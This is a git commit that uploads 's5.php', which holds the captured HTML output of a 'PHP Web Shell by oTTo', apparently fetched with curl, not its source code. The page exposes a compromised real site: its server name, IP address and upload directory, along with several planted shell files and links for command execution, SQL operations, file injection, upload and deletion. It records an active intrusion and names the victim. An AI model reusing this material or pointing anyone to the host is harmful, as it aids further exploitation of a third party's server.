432e50c201018710190fcedf4319921725a948ae
Ishan Oshada <63636533+Ishanoshada@users.noreply.github.com>
2023-07-25 17:13:45 +0530

    Add files via upload

---
+++ s5.php
@@ -0,0 +1,166 @@
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<html>
+	<head>
+		<title>PHP Web Shell by oTTo</title>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8";>
+		<style type="text/css">
+		body {font-family: "sans-serif", "serif"; font-size: 12px;}
+		BODY { background-color:#A2B5CD }
+		a:link {color: #BFEFFF; text-decoration: none}
+		a:visited {color: #080808; text-decoration: none}
+		a:hover {color: #FFFFFF; text-decoration: underline}
+		input {font-family: "sans-serif", "serif";font-size: 12px;}
+		td {font-family: "sans-serif", "Verdana"; font-size: 12px;}
+		.title {font-family: "Verdana", "Tahoma";font-size: 20px;font-weight: bold; color=black}
+		</style>
+	</head>
+	<body>
+		<table width="100%"  cellspacing="1" cellpadding="3">
+			<tr>
+				<td class="title" align="center">PHP Web Shell</td>
+			</tr>
+		</table>
+		<hr>
+		<table width="100%"  cellspacing="1" cellpadding="3">
+			<tr>
+				<td>Operating system:Linux</td>
+				<td>Server name:www.walking.or.kr</td>
+				<td>Server IP:34.92.83.16</td>
+			</tr>
+			<tr>
+				<td>Server time:23 07 25 08:41:14</td>
+				<td>Server port :80</td>
+			</tr>
+		</table>
+		<hr>
+		<table>
+		
+			<tr>
+				<td><a href="?shell=env"> [Server Envirement] </a></td>
+				<td><a href="?shell=checkdir"> [Brows Directory] </a></td>
+				<td><a href="?shell=command"> [Command] </a></td>
+				<td><a href="?shell=sql"> [Sql Operation] </a></td>
+				<td><a href="?shell=change"> [Tramslate Encode] </a></td>
+			</tr>
+		</table>
+		<hr>
+		<table>
+			<tr>
+				<td>Home dir:
+					<a href="?dir=/var/www/html/walk">
+					/var/www/html/walk</a>
+				</td>
+			</tr>
+			<tr>
+				<td>Current dir of contents:<font color="#00688B">/var/www/html/walk/bbs/upfile/gallery/test</font>				</td>
+			</tr>
+			<tr>
+				<td>
+					<form enctype="multipart/form-data" action="" method="post">
+					UploadFile:
+					<input name="upload_file" type="file" style="font-family:Verdana,Arial; font-size: 9pt;">
+					<input type="submit" value="Upload" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD">
+					</form>
+				</td>
+			</tr>
+					</table>
+
+		<table width="100%" border="0" cellspacing="1" cellpadding="3">
+			<form action="" method="get">
+				<tr>
+					<td>
+					The dir of contents glances over:
+					<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;">
+					<input type="submit" value="Goto" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD ">
+					</td>
+				</tr>
+			</form>
+		</table>
+		<hr>
+		<table width="100%" border="0" cellpadding="3" cellspacing="1">
+		<tr>
+		<td><b>Sub-Dir of contents</b></td>
+		</tr>
+
+		<a href="?dir=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/..">Back to higher authority dir of contents</a>		</table>
+		<hr>
+		<table width="100%" border="0" cellpadding="3" cellspacing="1">
+			<tr>
+				<td><b>FileName</b></td>
+				<td><b>FileDate</b></td>
+				<td><b>FileSize</b></td>
+				<td><b>FileOperations</b></td>
+			</tr>
+
+			<tr>
+<td>sh2.php</td>
+<td>2023-7-25 20:21:01</td>
+<td>10.9873046875 KB</td>
+<td><a href="?downFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/sh2.php"> [Down] </a>
+							  <a href="?delFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/sh2.php"> [Delete]</a>
+							  <a href="?refileName=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/sh2.php"> [Rename] </a>
+							  <a href="?editFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/sh2.php"> [Injects] </a></td>
+</tr>
+<tr>
+<td>s.php</td>
+<td>2023-7-25 20:21:41</td>
+<td>15.935546875 KB</td>
+<td><a href="?downFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s.php"> [Down] </a>
+							  <a href="?delFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s.php"> [Delete]</a>
+							  <a href="?refileName=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s.php"> [Rename] </a>
+							  <a href="?editFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s.php"> [Injects] </a></td>
+</tr>
+<tr>
+<td>s2.php</td>
+<td>2023-7-25 20:28:06</td>
+<td>13.0390625 KB</td>
+<td><a href="?downFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s2.php"> [Down] </a>
+							  <a href="?delFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s2.php"> [Delete]</a>
+							  <a href="?refileName=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s2.php"> [Rename] </a>
+							  <a href="?editFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s2.php"> [Injects] </a></td>
+</tr>
+<tr>
+<td>s3.php</td>
+<td>2023-7-25 20:33:09</td>
+<td>39.0283203125 KB</td>
+<td><a href="?downFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s3.php"> [Down] </a>
+							  <a href="?delFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s3.php"> [Delete]</a>
+							  <a href="?refileName=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s3.php"> [Rename] </a>
+							  <a href="?editFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s3.php"> [Injects] </a></td>
+</tr>
+<tr>
+<td>s4.php</td>
+<td>2023-7-25 20:34:35</td>
+<td>13.587890625 KB</td>
+<td><a href="?downFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s4.php"> [Down] </a>
+							  <a href="?delFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s4.php"> [Delete]</a>
+							  <a href="?refileName=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s4.php"> [Rename] </a>
+							  <a href="?editFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s4.php"> [Injects] </a></td>
+</tr>
+<tr>
+<td>s5.php</td>
+<td>2023-7-25 20:35:41</td>
+<td>9.5283203125 KB</td>
+<td><a href="?downFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s5.php"> [Down] </a>
+							  <a href="?delFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s5.php"> [Delete]</a>
+							  <a href="?refileName=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s5.php"> [Rename] </a>
+							  <a href="?editFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s5.php"> [Injects] </a></td>
+</tr>
+<tr>
+<td>s6.php</td>
+<td>2023-7-25 20:39:49</td>
+<td>43.30859375 KB</td>
+<td><a href="?downFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s6.php"> [Down] </a>
+							  <a href="?delFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s6.php"> [Delete]</a>
+							  <a href="?refileName=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s6.php"> [Rename] </a>
+							  <a href="?editFile=%2Fvar%2Fwww%2Fhtml%2Fwalk%2Fbbs%2Fupfile%2Fgallery%2Ftest/s6.php"> [Injects] </a></td>
+</tr>
+		</table>
+		<hr>
+
+		<table align="center"><tr><td>
+<h6>Copyright (C) 2013 All Rights Reserved
+</td></tr></table>
+</body>
+</html>
